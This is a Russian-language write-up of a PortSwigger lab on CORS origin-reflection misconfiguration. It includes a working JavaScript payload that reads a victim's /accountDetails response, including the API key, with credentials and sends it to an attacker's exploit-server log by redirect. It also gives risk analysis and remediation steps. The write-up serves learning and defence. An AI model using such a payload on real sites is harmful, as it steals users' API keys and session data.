# CORS Basic Origin Reflection Attack

> **Категория:** Web
> **Сложность:** Easy
> **Уязвимость:** CORS Misconfiguration (Origin Reflection)
> **Цель:** [https://portswigger.net/web-security/cors/lab-basic-origin-reflection-attack](https://portswigger.net/web-security/cors/lab-basic-origin-reflection-attack)

---

## Входные данные

Нам представлена страница магазина. Имеется поле авторизации.

![Страница авторизации](../../images/cors1_1.png)

Введя тестовые данные для входа, нам показывается наш api key. Задача — вытащить api key админа.

---

## Разведка

Потыкав различные ручки на сайте, я обнаружил ручку `/accountDetails`.

Я обратил на неё внимание по двум причинам:

1. Она возвращает чувствительную информацию.
2. В заголовках запроса стоит `Sec-Fetch-Mode: cors` + `Sec-Fetch-Dest: empty`. Это значит, что происходит асинхронный JS-запрос, ответ на который браузер заносит в переменную. Значит теоретически этот ответ можно прочитать скриптом, если CORS это позволит.

Перед нами вероятная **CORS Misconfiguration**. Чтобы это проверить, добавляем заголовок `Origin: evil.com`.

В ответе получаем:

```
Access-Control-Allow-Origin: evil.com
Access-Control-Allow-Credentials: true
```

Это подтверждает теорию — сервер **отражает любой Origin** и разрешает читать ответ вместе с куками (credentials).

![Запрос с Origin: evil.com и ответ сервера с ACAO/ACAC](../../images/cors1_2.png)

---

## Эксплуатация

К заданию прикреплён сайт атакующего, на который надо вставить пейлоад.

Код, который должен выполниться на страничке атакующего:

```html
<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;

    req.open('get', 'https://***.web-security-academy.net/accountDetails', 'true');
    req.withCredentials = true;
    req.send();

    function reqListener() {
        location = 'https://exploit-***.exploit-server.net/log?key='+this.responseText;
    }
</script>
```

В данном коде создаётся AJAX-запрос на `/accountDetails`. Так как `withCredentials = true`, браузер жертвы прикладывает к запросу её куки, а уязвимый CORS (отражение Origin + `ACAC: true`) позволяет скрипту на evil-сайте прочитать ответ. Полученные данные (`this.responseText`) отправляются на наш сервер через редирект на `/log?key=...`.

Загружаем пейлоад на exploit-сервер, отправляем жертве. Вуаля, флаг готов.

![Лог exploit-сервера с украденным apikey](../../images/cors1_3.png)

---

## Риск уязвимости

CORS Misconfiguration (отражение Origin) на эндпоинте `/accountDetails` позволяет атакующему:

- **Читать чувствительные данные жертвы** (`username`, `email`, `apikey`) без какого-либо взаимодействия, кроме перехода по ссылке на вредоносную страницу.
- **Обходить same-origin policy** за счёт того, что сервер слепо копирует присланный `Origin` в `Access-Control-Allow-Origin`, а не сверяет его со строгим белым списком.
- Поскольку `Access-Control-Allow-Credentials: true` выставлен вместе с отражённым Origin, атака работает **с авторизацией жертвы** — то есть крадутся именно её персональные данные, а не публичная информация.
- Украденный `apikey` потенциально даёт доступ к действиям от имени жертвы через API, что расширяет атаку за пределы простого чтения данных.

Поскольку уязвимость эксплуатируется без участия жертвы (кроме захода на страницу) и позволяет полностью деанонимизировать/скомпрометировать её API-ключ, severity можно оценивать как **High**.

---

## Меры по исправлению

1. **Создать белый список разрешённых доменов** с точным (strict) сравнением строк, без `startsWith`/`endsWith`/нестрогих regex.
2. **Не отражать `Origin`** из запроса напрямую в `Access-Control-Allow-Origin`.
3. **`Access-Control-Allow-Credentials: true` ставить только с конкретным проверенным Origin**, никогда с `*` или с отражённым значением.
4. **Не открывать CORS там, где кросс-доменный доступ не нужен вообще** — приватные, привязанные к сессии эндпоинты (вроде `/accountDetails`) не должны иметь `Access-Control-Allow-*` заголовков в принципе.

---

## Чему я научился

- Понял, как работает CORS и чем он отличается от Same-Origin Policy.
- Узнал про заголовки `Sec-Fetch-*` (`Sec-Fetch-Site`, `Sec-Fetch-Mode`, `Sec-Fetch-Dest`, `Sec-Fetch-User`) и как по ним быстро находить кандидатов для проверки в трафике.
- Узнал, что такое AJAX-запросы и почему именно они (а не `<img>`/`<iframe>`/обычная навигация) дают возможность прочитать чужой ответ.
- Понял роль `withCredentials` на стороне клиента и `Access-Control-Allow-Credentials` на стороне сервера — и почему нужны оба условия одновременно.
- Научился писать и доставлять пейлоад для CORS-эксплойта через exploit-сервер PortSwigger.
